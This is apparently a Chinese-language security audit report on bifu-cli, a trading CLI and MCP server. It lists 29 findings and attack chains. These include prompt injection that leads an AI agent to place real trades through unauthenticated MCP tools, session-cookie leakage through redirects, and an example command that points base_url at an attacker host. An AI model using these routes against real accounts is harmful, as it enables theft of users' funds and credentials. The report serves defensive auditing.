# Security\_Audit\_Report\_bifu\-cli\_2026













**代码安全审计报告**



bifu\-cli

BifuFX 交易客户端 CLI — 通过 CLI 命令与 MCP stdio 服务端暴露现货/合约/外汇/资金/Orion 信号交易能力，供终端用户与 AI agent（Claude Desktop/Cursor 等）调用。会话 cookie 明文存于 \~/\.bifu\-cli/config\.yaml。









|**报告编号**|SA\-BIFU\-CLI\-202606|
|---|---|
|**报告版本**|V1\.0|
|**密级标识**|内部机密|
|**审计模式**|Deep（深度审计）|
|**审计日期**|2026年6月28日|
|**审计方**|安全审计团队|
|**委托方**|Decode Exchange|

---

# 目录

目录

目录3

1\. 审计概述7

2\. 风险总览8

2\.1 系统风险与资损风险评估8

3\. 关键发现 TOP 58

\#1 — MCP 交易工具零认证/零授权 \+ 零参数校验8

\#2 — 会话 Cookie 经未受限重定向泄露（实测）9

\#3 — 发布链零校验 \+ 未签名 \+ macOS 隔离剥离（链\-5）9

\#4 — base\_url 无 scheme \+ cookie 不绑定主机9

\#5 — 外汇金额 float64 精度损失9

4\. 攻击链分析9

链\-1：prompt\-injection 直达真实交易（最现实）9

链\-2：base\_url/重定向/代理窃取会话 cookie → 全账户接管10

链\-3：本机/备份读取明文 cookie → 会话劫持10

链\-4：verbose 日志泄露 forex 账户密码10

链\-5（第2轮新增）：发布/构建链被控 → 未签名二进制 → RCE → 明文 cookie 窃取10

5\. 修复优先级路线图10

6\. 项目技术画像13

6\.1 技术栈13

6\.2 入口点清单13

7\. 漏洞详情清单14

\[BIFU\-CLI\-202606\-001\] MCP 交易工具零认证/零授权 \+ 零参数校验，prompt\-injection 可直接触发真实交易14

\[BIFU\-CLI\-202606\-002\] 会话 Cookie 经未受限重定向泄露（实测 Go 默认不剥离手动 Cookie 头）15

\[BIFU\-CLI\-202606\-003\] base\_url 无 scheme/目标校验 \+ cookie 不绑定登录主机 → 明文传输/客户端 SSRF/凭据外泄17

\[BIFU\-CLI\-202606\-004\] 会话 cookie/token 明文存储（仅靠 0600 文件权限；Windows ACL 失效）18

\[BIFU\-CLI\-202606\-005\] \-\-verbose 记录 POST body，forex 建账户密码明文入 stderr；文档谎称自动脱敏20

\[BIFU\-CLI\-202606\-006\] MCP cancel 工具 JSON 输出注入（orderId 字符串拼接）21

\[BIFU\-CLI\-202606\-007\] WS URL 无 wss 强制，可 ws:// 明文传输私有交易流22

\[BIFU\-CLI\-202606\-008\] 安装/升级链下载二进制无 checksum/签名校验（三渠道）23

\[BIFU\-CLI\-202606\-009\] ClientOrderID 嵌入 userID \+ 非密码学 timestamp 生成（可碰撞/去重）25

\[BIFU\-CLI\-202606\-010\] UToken/VToken 死字段可写但无消费26

\[BIFU\-CLI\-202606\-011\] upgrade 用 sh \-c，Windows 无 sh 失败（功能性）27

\[BIFU\-CLI\-202606\-012\] QR device 登录 issueID 在 URL 明文路径 \+ 2min 轮询窗口27

\[BIFU\-CLI\-202606\-013\] CLI 交易命令无预登录闸门 \+ \#nosec 抑制建议复核28

\[BIFU\-CLI\-202606\-014\] 外汇/支付金额用 float64（精度损失），与现货/合约 string 类型不一致29

\[BIFU\-CLI\-202606\-015\] 发布产物未签名 \+ Homebrew cask 显式剥离 macOS Gatekeeper 隔离31

\[BIFU\-CLI\-202606\-016\] release\.yml: 单一宽权限 PAT 跨两外部仓库 \+ GitHub Actions 浮动标签未 SHA 固定32

\[BIFU\-CLI\-202606\-017\] 合约订单字段全部调用方可控且无跨字段一致性约束（mass\-assignment 类）33

\[BIFU\-CLI\-202606\-018\] HTTP\_PROXY/HTTPS\_PROXY 默认生效，会话 cookie 与登录密码可被 MITM 代理截获34

\[BIFU\-CLI\-202606\-019\] \-\-password / \-\-auth\-cookie 走命令行，进程列表/shell history 泄露36

\[BIFU\-CLI\-202606\-020\] npm 安装器失败时 process\.exit\(0\) 静默成功37

\[BIFU\-CLI\-202606\-021\] npm tar \-xf 解压不可信归档（tar\-slip 潜在）38

\[BIFU\-CLI\-202606\-022\] 错误响应回显原始 body（≤200\-500 字符），无需 \-v39

\[BIFU\-CLI\-202606\-023\] \.gitignore 不完整（无 \*\.pem/\*\.key/\*\.p12 等密钥文件规则）40

\[BIFU\-CLI\-202606\-024\] MCP 只读工具把完整余额/持仓/权益/账户ID 泄露进 AI 代理上下文41

\[BIFU\-CLI\-202606\-025\] BIFU\_CLI\_HOME 环境变量覆盖 config 目录，无校验/符号链接检查42

\[BIFU\-CLI\-202606\-026\] extractCookie 无条件信任服务端返回的 cookie 名43

\[BIFU\-CLI\-202606\-027\] skills install \<dir\> 写入目标目录无 filepath\.Clean/containment44

\[BIFU\-CLI\-202606\-028\] 撤单确认不一致（CLI cancel \-\-all 有确认，MCP/单笔撤单无）45

\[BIFU\-CLI\-202606\-029\] gorilla/websocket v1\.5\.3 为上游归档最终版（无维护补丁路径）46

8\. 攻击链详细分析47

链\-1：prompt\-injection 直达真实交易（最现实，最高资损）47

链\-2：base\_url/重定向/代理窃取会话 cookie → 全账户接管47

链\-3：本机/备份读取明文 cookie → 会话劫持48

链\-4：verbose 日志泄露 forex 账户密码48

链\-5：发布/构建链被控 → 未签名二进制 → RCE → 明文 cookie 窃取48

9\. 审计覆盖率矩阵49

附录50

附录A — 审计方法论说明50

附录B — 严重性等级定义50

附录C — 审计工具与技术50

附录D — 审计范围与限制声明50

附录E — 复审排除清单51



---

**第一部分：管理层摘要**



# 1\. 审计概述

bifu\-cli 是代码卫生良好的小型金融交易客户端（7685 LOC）。传统高危面基本不存在：无 SQL/ORM、无反序列化、无模板渲染、无命令注入（exec 均为编译期固定串）、TLS 默认强制校验、依赖经 govulncheck 确认无漏洞。但作为『AI agent 可驱动真实资金交易』的金融客户端，存在两类突出真实风险：① MCP 服务端零认证/零授权 \+ 零参数校验（18/18 写端点），prompt\-injection 可直接触发真实交易与资金移动；② 会话 cookie 不绑定登录主机（配置可控 base\_url / 重定向 / HTTP\_PROXY），任何上述路径都把交易全权令牌外发。第 2 轮补审新增 16 项发现（float64 金额精度、发布未签名\+macOS 隔离剥离、CI 宽 PAT\+浮动 Action、合约字段 mass\-assignment、HTTP\_PROXY 截获、npm 静默成功/tar\-slip、错误回显 body、MCP 只读泄露财务画像、\.gitignore 不全等），合并后共 29 项。

|**审计目标**|bifu\-cli 金融交易客户端 CLI 全量源码 \+ 分发安装链 \+ CI/发布链 \+ 依赖供应链|
|---|---|
|**审计范围**|全量源码审计：cmd/\*（cobra CLI）、internal/mcp（MCP 服务端）、internal/client（HTTP/WS 客户端）、internal/clifconfig（凭据存储）、internal/api/\*（spot/contract/payment/orion/meta）、cmd/auth（登录/2FA/QR device）、cmd/upgrade（自动升级）、install\.sh、npm/\*（分发安装链）、\.goreleaser\.yaml \+ \.github/workflows（CI/发布链）、go\.mod（依赖供应链）|
|**技术栈**|Go 1\.25\.5 \+ spf13/cobra 1\.10\.2（CLI）\+ mark3labs/mcp\-go 0\.55\.1（MCP stdio 服务端）\+ gorilla/websocket 1\.5\.3 \+ gopkg\.in/yaml\.v3 3\.0\.1 \+ golang\.org/x/text 0\.38\.0|
|**审计模式**|Deep（深度审计） — 全覆盖、攻击链建模、业务逻辑审计|
|**审计方法**|静态代码分析 \+ 数据流追踪 \+ 攻击链建模 \+ 覆盖率矩阵验证 \+ 运行时实测验证（Go 重定向行为 PoC \+ govulncheck）。第 2 轮：4 Agent 并行\(R1\) \+ 攻击链验证/资源展开\(R2a\) \+ 质量专项\(R2b\)。|
|**审计周期**|2026年6月28日（第 2 轮补审: 2026\-06\-28）|



# 2\. 风险总览

**整体风险评级：****极高**

经两轮审计（第1轮 R1×3\+R2 含运行时 PoC/govulncheck；第2轮 R1×4\+R2a/R2b），合并确认 29 个发现：High 6、Medium 10、Low 10、Info 3。最高风险为 MCP 工具的无认证交易暴露面（001，第2轮评 Critical 待裁定）、会话 cookie 不绑定主机致外泄/账户接管（002/003）、发布链零校验\+未签名（008/015，第2轮评 High 待裁定）。

|**严重性等级**|**数量**|**说明**|
|---|---|---|
|**Critical**|**0**|可导致系统完全沖陷或资金盗窃|
|**High**|**6**|可导致严重业务影响|
|**Medium**|**10**|需要特定条件利用或影响有限|
|**Low**|**10**|安全卫生问题|



## 2\.1 系统风险与资损风险评估

**系统风险: **bifu\-cli 为客户端 CLI，不托管后端服务，故无直接『全站宕机/撮合停摆』类系统风险。最高系统风险来自 BIFU\-CLI\-202606\-001（MCP 无认证\+18/18 写端点零校验）与 BIFU\-CLI\-202606\-015/016（发布未签名\+CI 宽 PAT/浮动 Action）——前者可向后端提交非法交易请求触发风控；后者若发布/构建链被控，恶意二进制经 npm/Homebrew/curl 三渠道分发到所有交易者机器，形成终端级 RCE 与大规模感染。整体系统风险评估：中高（影响集中在凭据保密性、交易请求完整性与分发链完整性，无单点服务宕机面）。

**资损风险: **资损风险极高。BIFU\-CLI\-202606\-001 可经 prompt\-injection 直接触发任意真实下单/撤单/转账（最坏：单次清空账户仓位或制造巨额亏损单；forex float64 无校验可下负手数/0 价单）。BIFU\-CLI\-202606\-002/003/018 可致会话 cookie 泄露→冒充用户全账户交易与资金划转（最坏：账户资产被清空/盗取，cookie 30 天有效）。BIFU\-CLI\-202606\-008/015/016 发布链被控可大规模窃取明文 config\.yaml cookie 致全量用户资损。最高资损风险 = BIFU\-CLI\-202606\-001（无门槛、AI agent 可直达真实交易与转账）。



# 3\. 关键发现 TOP 5

## \#1 — MCP 交易工具零认证/零授权 \+ 零参数校验

MCP 服务端无任何认证授权层，4 个下单/撤单工具直接绑定活跃 profile 全权交易能力；18/18 写端点零客户端校验

**业务影响: **prompt\-injection 可诱导 AI agent 任意下单/撤单/转账，最坏清空账户或制造巨额亏损单**    建议修复期限: **1 周内（P0）**    修复工作量: **中（加二次确认 \+ 参数校验）

## \#2 — 会话 Cookie 经未受限重定向泄露（实测）

HTTPClient 无 CheckRedirect，实测 Go 默认不剥离手动 Cookie 头，跨域 302 把交易全权令牌明文外发

**业务影响: **会话 cookie 泄露 → 冒充用户全账户交易/转账，最坏账户资产被清空**    建议修复期限: **1 周内（P0）**    修复工作量: **小（设 CheckRedirect 剥离 Cookie）

## \#3 — 发布链零校验 \+ 未签名 \+ macOS 隔离剥离（链\-5）

install\.sh/npm/upgrade 三渠道下载执行不校验 checksum（checksums\.txt 已生成却未消费）；产物未签名；cask 剥离 Gatekeeper

**业务影响: **发布渠道被控即大规模 RCE \+ 明文 cookie 窃取 → 全量用户资金风险**    建议修复期限: **1 周内（P0）**    修复工作量: **中（checksum 校验 \+ cosign 签名 \+ 移除剥离）

## \#4 — base\_url 无 scheme \+ cookie 不绑定主机

config set 不校验 https，可设 http://（明文 cookie/密码）或攻击者主机（首请求外发 cookie）；cookie 不绑定登录主机

**业务影响: **MITM 窃取登录密码与会话 / cookie 外发攻击者主机 → 全账户资金操控**    建议修复期限: **2 周内（P1）**    修复工作量: **中（scheme 校验 \+ host 绑定）

## \#5 — 外汇金额 float64 精度损失

forex Volume/Price/SL/TP 与划转 Amount 用 float64，与现货/合约 string 不一致，IEEE754 舍入漂移

**业务影响: **订单尺寸/止损止盈位/划转金额偏差，SL/TP 失效放大亏损**    建议修复期限: **2 周内（P1）**    修复工作量: **中（改 string 定点）

# 4\. 攻击链分析

## 链\-1：prompt\-injection 直达真实交易（最现实）

AI agent 读恶意内容\(prompt\-injection\) → 调用 MCP 下单/撤单工具（无护栏）→ 任意真实交易/转账

**前置条件: **受害者已 mcp install 注册 bifu\-cli 到 AI 客户端，且 AI 处理了不可信内容**  \|  最终影响: **任意真实下单/撤单/转账，最坏清空账户仓位或制造巨额亏损单（资损）  \|  涉及漏洞: BIFU\-CLI\-202606\-001,BIFU\-CLI\-202606\-017,BIFU\-CLI\-202606\-028

## 链\-2：base\_url/重定向/代理窃取会话 cookie → 全账户接管

植入/诱导 http:// 或攻击者 base\_url（003）→ 首请求外发 cookie；或后端 302（002）→ cookie 泄露；或恶意 HTTP\_PROXY（018）→ 流量经攻击者代理 → 会话劫持 → 全账户交易/转账

**前置条件: **能写入/影响 config\.yaml，或后端存在 open\-redirect / MITM / 恶意代理 env**  \|  最终影响: **会话 cookie 泄露 → 冒充用户全账户交易与资金划转，最坏账户资产被清空  \|  涉及漏洞: BIFU\-CLI\-202606\-003,BIFU\-CLI\-202606\-002,BIFU\-CLI\-202606\-018

## 链\-3：本机/备份读取明文 cookie → 会话劫持

本机进程/备份/云同步读取 \~/\.bifu\-cli/config\.yaml 明文 cookie（004）→ 会话劫持 → 交易/转账

**前置条件: **本机另一进程/备份系统/云同步可读 config\.yaml**  \|  最终影响: **会话 cookie 被读取 → 冒充用户交易/转账  \|  涉及漏洞: BIFU\-CLI\-202606\-004

## 链\-4：verbose 日志泄露 forex 账户密码

用户 \-v 调试 forex 建账户（005）→ 密码明文入 stderr → 日志采集 → forex 账户被登录

**前置条件: **用户开启 \-\-verbose 执行 forex 建账户**  \|  最终影响: **forex 账户密码泄露 → 外汇账户资金风险  \|  涉及漏洞: BIFU\-CLI\-202606\-005

## 链\-5（第2轮新增）：发布/构建链被控 → 未签名二进制 → RCE → 明文 cookie 窃取

攻击者控制 GitHub release/账户，或劫持 goreleaser\-action 浮动标签（016），或重定向 npm 下载 → 未校验二进制经 install\.sh/npm 解压执行（008，未签名 015）→ 恶意二进制读取 \~/\.bifu\-cli/config\.yaml 明文 cookie（004）→ 完整账户接管

**前置条件: **发布/CI 渠道被控（HTTPS\-to\-GitHub 拦截 casual MITM；PAT 泄露或 Action 标签被劫持）**  \|  最终影响: **全量用户 RCE \+ cookie 盗取 → 全账户资金风险（发布渠道级灾难）  \|  涉及漏洞: BIFU\-CLI\-202606\-008,BIFU\-CLI\-202606\-015,BIFU\-CLI\-202606\-016,BIFU\-CLI\-202606\-004

# 5\. 修复优先级路线图

**P0 — 立即修复（阻塞上线，1周内完成）**

- BIFU\-CLI\-202606\-001: MCP 写入工具加二次确认 \+ 下单参数客户端校验（size/amount \>0\+上限、side 组合一致性）

- BIFU\-CLI\-202606\-002: HTTPClient 设 CheckRedirect 剥离跨 host Cookie \+ 限制跳转次数

- BIFU\-CLI\-202606\-015: 发布加 cosign/签名 \+ 移除 macOS cask quarantine 剥离

- BIFU\-CLI\-202606\-018: 认证客户端显式 Transport 收紧/禁用代理 env

**P1 — 短期修复（2周内完成）**

- BIFU\-CLI\-202606\-003: config set 强制 base\_url/web\_url 为 https://（WS 为 wss://）\+ cookie 绑定主机

- BIFU\-CLI\-202606\-004: 会话 cookie 接入 OS keychain（Keychain/DPAPI/libsecret）或 AES\-GCM 加密

- BIFU\-CLI\-202606\-005: verbose 对 body 按敏感字段脱敏 \+ 修正 docs/usage\-agents\.md:304

- BIFU\-CLI\-202606\-008: 安装/升级链发布并校验 checksums\.txt（已生成却未消费）

- BIFU\-CLI\-202606\-014: 外汇金额改 string 定点（与现货/合约对齐）

- BIFU\-CLI\-202606\-016: CI Actions 全 SHA 固定 \+ 分离最小权限 token \+ OIDC

- BIFU\-CLI\-202606\-017: 合约字段跨字段不变量（平仓强制 reduceOnly、side 组合白名单）

**P2 — 中期修复（1个月内完成）**

- BIFU\-CLI\-202606\-006: MCP cancel 工具用 json\.Marshal 构造返回 JSON

- BIFU\-CLI\-202606\-007: 私有 WS 流强制 wss://

- BIFU\-CLI\-202606\-009: ClientOrderID 不嵌入 user\_id（改 crypto/rand 或 HMAC）\+ 随机后缀防碰撞

- BIFU\-CLI\-202606\-019: \-\-password/\-\-auth\-cookie 改 env/stdin，移除命令行密码示例

- BIFU\-CLI\-202606\-022: 错误响应仅保留状态码\+简短 retMsg，body 仅 verbose 脱敏输出

- BIFU\-CLI\-202606\-024: MCP 只读工具默认脱敏/摘要模式

**P3 — 长期优化**

- BIFU\-CLI\-202606\-010: 删除 UToken/VToken 死字段

- BIFU\-CLI\-202606\-011: upgrade 在 Windows 用 cmd /c 或直接调用包管理器

- BIFU\-CLI\-202606\-012: QR device issueID 不放 URL 路径 \+ WebURL 强制 https

- BIFU\-CLI\-202606\-013: 交易命令加预登录闸门 \+ 建立 \#nosec 定期复核流程

- BIFU\-CLI\-202606\-020: npm 安装器失败非零退出 \+ 醒目 WARNING

- BIFU\-CLI\-202606\-021: npm tar 解压前校验成员路径不含 \.\./

- BIFU\-CLI\-202606\-023: \.gitignore 补全 \*\.pem/\*\.key/\*\.p12/\*\.crt 等密钥规则

- BIFU\-CLI\-202606\-025: BIFU\_CLI\_HOME 目录权限/符号链接校验

- BIFU\-CLI\-202606\-026: extractCookie 对 cookie 名做白名单校验

- BIFU\-CLI\-202606\-027: skills install 目标目录 filepath\.Clean \+ 拒绝符号链接

- BIFU\-CLI\-202606\-028: MCP 撤单加确认（统一门控）

- BIFU\-CLI\-202606\-029: 评估迁移 github\.com/coder/websocket

**无需修复**

---

















**以下为技术详情，供开发团队使用**

管理层阅读到此即可。开发人员请继续阅读漏洞详情与修复指南。

---

**第二部分：技术详情**



# 6\. 项目技术画像

## 6\.1 技术栈

|**组件**|**版本/说明**|
|---|---|
|**Go**|1\.25\.5（toolchain go1\.25\.11）|
|**spf13/cobra**|1\.10\.2（CLI 框架）|
|**mark3labs/mcp\-go**|0\.55\.1（MCP stdio 服务端，主入站面）|
|**gorilla/websocket**|1\.5\.3（WebSocket 客户端，归档，拟迁 coder/websocket）|
|**gopkg\.in/yaml\.v3**|3\.0\.1（配置/凭据序列化）|
|**golang\.org/x/text**|0\.38\.0|
|**golang\.org/x/term**|0\.44\.0（密码隐藏输入）|
|**mdp/qrterminal**|v3\.2\.1（QR 扫码登录）|
|**GoReleaser \+ GitHub Actions**|跨平台发布（npm\+homebrew\+curl），未签名|



## 6\.2 入口点清单

|**方法**|**端点**|**功能**|**认证**|
|---|---|---|---|
|MCP tool|create\_spot\_order|现货下单（写）|**无**|
|MCP tool|create\_contract\_order|合约下单（写）|**无**|
|MCP tool|cancel\_spot\_order|现货撤单（写）|**无**|
|MCP tool|cancel\_contract\_order|合约撤单（写）|**无**|
|MCP tool|get\_spot\_balance|现货余额（读）|**无**|
|MCP tool|get\_contract\_account|合约账户（读）|**无**|
|MCP tool|list\_\*\_open\_orders|挂单查询（读）|**无**|
|CLI|auth login / \-\-device|登录/QR 登录|**无**|
|CLI|config set / init|配置（写 config\.yaml）|**无**|
|CLI|spot/contract place\-order/cancel|下单/撤单（写）|cookie|
|CLI|forex create\-account / order|外汇建账/下单（写，float64）|cookie|
|CLI|payment transfer / unified\-transfer|资金划转（写）|cookie|
|CLI|upgrade|自动升级（exec）|**无**|
|CLI|mcp install / skills install|写磁盘配置/技能|**无**|
|CLI|ws|WebSocket 行情/私有流|cookie|
|分发|install\.sh / npm postinstall / upgrade|二进制下载安装（无校验）|**无**|



# 7\. 漏洞详情清单

共 29 个漏洞（经人工复审验证，排除 0 个误报），按严重性排序。每个条目包含完整的漏洞描述、影响分析、修复建议和验证方法。所有漏洞均已通过人工复验确认。

## \[BIFU\-CLI\-202606\-001\] MCP 交易工具零认证/零授权 \+ 零参数校验，prompt\-injection 可直接触发真实交易

|**严重性: High**|维度: D3 授权 \+ D9 业务逻辑|OWASP: A01:2021 失效的访问控制 / A03:2021 注入（输入校验缺失）|**优先级: P0**|
|---|---|---|---|
|文件: internal/mcp/server\.go:32,100\-181,183\-209||端点: MCP stdio 工具：create\_spot\_order / create\_contract\_order / cancel\_spot\_order / cancel\_contract\_order||
|**人工复验: 已通过 ✔**  已确认：MCP server 无 auth 中间件，size/price 直传无数值校验。订正：side/type/positionSide 有 Enum 约束，但金融数值与 reduceOnly 语义确未校验；缓解仅 stdio\-only。||||

### 漏洞描述

NewServer 创建 MCP 服务端时未注册任何认证/授权中间件；4 个写入工具直接绑定活跃 profile 的全权交易能力。size/price/side/positionSide/reduceOnly 全部 GetString/RequireString 直传 CreateOrderReq，无任何客户端校验（变体分析确认 18/18 写端点零校验）。配合 cmd/mcp/mcp\.go 的 setup 自动注册到 Claude/Cursor，攻击面 = 整个活跃账户的交易权限。【第2轮补充】4 写工具 handler 精确位置: server\.go:100\-134\(spot create\)/136\-181\(contract create\)/183\-195\(spot cancel\)/197\-209\(contract cancel\)，均仅 RequireString 必填校验，无 confirm/limit/allowlist/audit。第2轮独立评定为 Critical（分歧待 Phase 2 裁定）：本产品核心定位即『让 AI 代理交易』，写操作零滥用防护，间接 prompt injection 在 2026 是现实威胁，金融损失真实；配合 017\(合约 mass\-assignment\)与无上限数值，单次注入可下任意金额。缓解: stdio\-only\(已验证无 net\.Listen\)。

### 影响分析

被 prompt\-injection 的 AI agent（或任何本地 stdio 进程）可直接调用下单/撤单/转账工具，以任意 size/price/side 触发真实交易与资金移动，无任何客户端护栏。

**系统风险: **MCP 服务端无认证层，被注入的 agent 可任意调用下单/撤单工具并构造异常订单（负 size、零价、超大手数）冲击后端撮合/风控；最坏触发后端异常处理路径或风控告警。CLI 不托管服务，无单点宕机面，但可向后端提交非法交易请求。

**资损风险: **直接资损——prompt\-injection 可诱导 agent 以任意 size/price/side 下真实现货/合约单、撤单、转账，最坏可在用户无感知下清空账户仓位或制造大额亏损单；forex float64 无校验可下负手数/0 价单。可量化：单次即可下出超越用户风险承受的巨额订单或反向开仓。

### 漏洞代码

s := server\.NewMCPServer\("bifu\-cli", version, server\.WithToolCapabilities\(true\), \.\.\.\) // 无 auth 中间件
// create\_spot\_order handler:
size, \_ := r\.RequireString\("size"\)          // 无 ParseFloat / 无 \>0 / 无范围校验
return jsonResult\(spot\.CreateOrder\(\&\.\.\.\{Size: size, Price: r\.GetString\("price","0"\)\}\)\)

### 数据流

AI agent\(prompt\-injection\) → MCP stdio → create\_spot\_order/create\_contract\_order → GetString 直传 → spot/contract\.CreateOrder → HTTPClient\.PostSpot/PostContract → 后端真实下单

### 利用场景

1\. 受害者安装 bifu\-cli 并 mcp install 注册到 AI 客户端
2\. 让 AI 处理含 prompt\-injection 的网页/邮件/文档
3\. 注入指令诱导 agent 调用 create\_contract\_order\(size=\-9999, 异常 side 组合\) 或 cancel\_\*\_order
4\. 真实下单/撤单/转账执行 → 资金损失

### 修复建议

**优先级: P0  \|  **为 MCP 写入工具增加二次确认机制（返回待确认态/nonce 回传）或显式 \-\-allow\-trade 白名单；客户端校验关键参数。

// 1\) 参数校验（size/amount 强制正数\+上限）
sizeF, err := strconv\.ParseFloat\(size, 64\)
if err \!= nil \|\| sizeF \<= 0 \|\| sizeF \> maxOrderSize \{
    return mcp\.NewToolResultError\("invalid size"\), nil
\}
// 2\) MCP 写入工具二次确认（伪码）
if \!profile\.AllowTrade \{
    return pendingConfirmation\(id\), nil // 要求 agent 回传 nonce 确认
\}

至少在 WithInstructions 中明确警告『本工具可执行真实交易』，并引导用户使用只读/低额 profile。

### 验证方法

- 1\. 打开 internal/mcp/server\.go 确认 NewMCPServer 无 auth 中间件

- 2\. 查看 create\_spot\_order/create\_contract\_order handler 确认 size/price/side 直传无校验

- 3\. Grep ParseFloat\|\> 0\|Sign\\\(\|Abs\\\( 在写路径确认 0 命中（18/18 零校验）

**关联漏洞: **BIFU\-CLI\-202606\-006, BIFU\-CLI\-202606\-017, BIFU\-CLI\-202606\-024, BIFU\-CLI\-202606\-028

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-002\] 会话 Cookie 经未受限重定向泄露（实测 Go 默认不剥离手动 Cookie 头）

|**严重性: High**|维度: D6 SSRF \+ D2 认证|OWASP: A02:2021 加密机制失效 / A07:2021 身份认证失效|**优先级: P0**|
|---|---|---|---|
|文件: internal/client/client\.go:84,90（NewHTTPClient 无 CheckRedirect）、62\-66（ApplyCookie）、184||端点: 所有经 HTTPClient\.do 的受认证 HTTP 请求（spot/contract/payment/orion）||
|**人工复验: 已通过 ✔**  已确认：HTTPClient 无 CheckRedirect \+ 手动注入 Cookie 头，跨主机 302 会外发会话 cookie（初审已运行时实测）。||||

### 漏洞描述

HTTPClient 的 http\.Client 仅设 Timeout，未设 CheckRedirect。ApplyCookie 用 req\.Header\.Set\("Cookie", name\+"="\+val\) 手动注入会话 cookie。实测（Go 1\.25\.11 httptest PoC）确认：Go net/http 默认 CheckRedirect 不剥离手动设置的 Cookie 头，跨域 302 目标主机实际收到完整 Cookie: session=SECRET。会话 cookie 是交易全权令牌。

### 影响分析

若任何受认证端点经 API 网关/代理/CDN 返回 302 指向其他主机，完整会话 cookie 明文发往该目标；与 base\_url 可设 http（003）叠加时，配合 MITM 或 open\-redirect 即可窃取会话。

**系统风险: **Cookie 泄露本身不直接致系统宕机，但泄露的会话令牌可用于冒充用户批量调用后端 API，异常流量可能触发后端限流/风控。无单点服务失效面。

**资损风险: **会话 cookie（user\_auth\_name）是交易全权令牌，泄露即可冒充用户下单/撤单/转账——直接盗取/挪用资金。可量化：单次泄露即可获得该账户全部交易与转账权限，最坏清空账户资产。

### 漏洞代码

func NewHTTPClient\(profile \*clifconfig\.Profile\) \*HTTPClient \{
    return \&HTTPClient\{http: \&http\.Client\{Timeout: timeout\}, \.\.\.\}   // 无 CheckRedirect
\}
func \(am \*AuthManager\) applyCookieLocked\(req \*http\.Request\) \{
    req\.Header\.Set\("Cookie", am\.profile\.AuthCookieName\+"="\+am\.profile\.AuthCookie\)
\}

### 数据流

config\.yaml 明文 cookie → AuthManager\.ApplyCookie → req\.Header\.Set\("Cookie"\) → http\.Do → Go 默认重定向策略不剥离 header → 302 目标 host 收到 cookie

### 利用场景

诱导/利用后端某端点产生到攻击者主机的重定向（open\-redirect / CDN 日志 / 或 003 下 base\_url=http 攻击者主机）→ cookie 泄露 → 冒充用户交易/转账

### 修复建议

**优先级: P0  \|  **为 http\.Client 设置 CheckRedirect，跨 host 重定向一律剥离 Cookie 头并限制跳转次数。

http\.Client\{
    Timeout: timeout,
    CheckRedirect: func\(req \*http\.Request, via \[\]\*http\.Request\) error \{
        req\.Header\.Del\("Cookie"\)
        if len\(via\) \>= 10 \{ return fmt\.Errorf\("too many redirects"\) \}
        return nil
    \},
\}

或对跨 host 重定向直接 return http\.ErrUseLastResponse 拒绝跟随。

### 验证方法

- 1\. 打开 internal/client/client\.go 确认 NewHTTPClient 的 http\.Client 无 CheckRedirect

- 2\. 确认 applyCookieLocked 用 Header\.Set\("Cookie",\.\.\.\) 手动注入

- 3\. 运行时 PoC：端口A→302→端口B，客户端 Header\.Set Cookie 请求A，确认端口B 收到 Cookie

**关联漏洞: **BIFU\-CLI\-202606\-003, BIFU\-CLI\-202606\-004, BIFU\-CLI\-202606\-018

────────────────────────────────────────────────────────────

## \[BIFU\-CLI\-202606\-003\] base\_url 无 scheme/目标校验 \+ cookie 不绑定登录主机 → 明文传输/客户端 SSRF/凭据外泄

|**严重性: Medium**|维度: D8 配置 \+ D6 SSRF|OWASP: A05:2021 安全配置错误 / A02:2021 加密机制失效|**优先级: P1**|
|---|---|---|---|
|文件: cmd/config/config\.go:147（setIfChanged base\_url）、internal/clifconfig/config\.go:34,225\-262||端点: config set \-\-base\-url / config init \-\-env custom（写入 BaseURL，派生所有 HTTP/WS URL）||
|**人工复验: 已通过 ✔**  已确认：base\_url 无 scheme/host 校验，所有 URL builder 以其为根；cookie 不绑定主机。||||

### 漏洞描述

base\_url 完全用户可控，config set 的 setIfChanged 直接赋值无 https:// 校验（config init 虽默认 https/wss 但 set 可改）。所有 HTTP/WS URL（GetPublicURL/GetPaymentURL/GetOrionURL/GetWS\*URL）以 BaseURL 为根。【第2轮补充（资源展开）】cookie 不绑定主机是系统性根因：全仓仅 2 个 cookie 附着点（client\.go:184 HTTP / websocket\.go:99 WS）\+ 7 个 URL builder（config\.go:225\-289），0 处对 host/scheme 限制，也未把 cookie 绑定到登录时主机。与 002（重定向）正交但同源：cookie 可被发往任意配置可控 host。攻击链 C：共享/恶意 profile → cookie 外泄 → 完整账户接管。

### 影响分析

设为 http:// → 登录密码（login\.go:418）与会话 cookie 明文传输；设为攻击者/内网地址 → cookie 在首请求即外发（无需重定向，与 002 互补）。

**系统风险: **允许 http:// 与任意主机，明文传输可被中间人篡改请求/响应，注入恶意交易响应扰乱客户端状态。无直接服务宕机面。

**资损风险: **http:// 下 cookie/密码明文可被 MITM 窃取→账户被盗；指向攻击者主机时 cookie 首请求即外发→直接获得交易/转账权限。可量化：可截获登录密码与会话，进而全账户资金操控。

### 漏洞代码

// cmd/config/config\.go — setIfChanged 无 scheme 校验
setIfChanged\(cmd, "base\-url", func\(\) \{ p\.BaseURL = baseURL \}\)
// clifconfig/config\.go — 所有出站 URL 以 BaseURL 为根
func \(p \*Profile\) GetPublicURL\(path string\) string \{ return p\.BaseURL \+ p\.PublicPath \+ path \}

### 数据流

config\.yaml → Profile\.BaseURL → GetPublicURL/GetPaymentURL/GetWS\*URL → HTTP/WS 请求

### 利用场景

config set \-\-base\-url http://attacker 或诱导用户配置恶意 profile → login 密码 POST \+ 会话 cookie 直发攻击者主机

### 修复建议

**优先级: P1  \|  **config set 校验 base\_url/web\_url 必须为 https://（WS 为 wss://），拒绝其他 scheme；ApplyCookie 仅在 host 匹配登录签发主机时附加（cookie 绑定主机）。

if \!strings\.HasPrefix\(baseURL, "https://"\) \{
    return fmt\.Errorf\("base\_url must use https://"\)
\}
// ApplyCookie 加 host 绑定
if \!am\.cookieHostMatches\(req\.URL\.Host\) \{ return \}

对 http:// 仅在显式 \-\-insecure 标志下允许，并打印风险警告。

### 验证方法

- 1\. 打开 cmd/config/config\.go 确认 setIfChanged base\-url 无 scheme 校验

- 2\. 确认 clifconfig Get\*URL 均以 BaseURL 为根（7 个 builder）

- 3\. 确认 ApplyCookie\(client\.go:62\-65\)无 host 判断

**关联漏洞: **BIFU\-CLI\-202606\-002, BIFU\-CLI\-202606\-007, BIFU\-CLI\-202606\-018

────────────────────────────────────────────────────────────

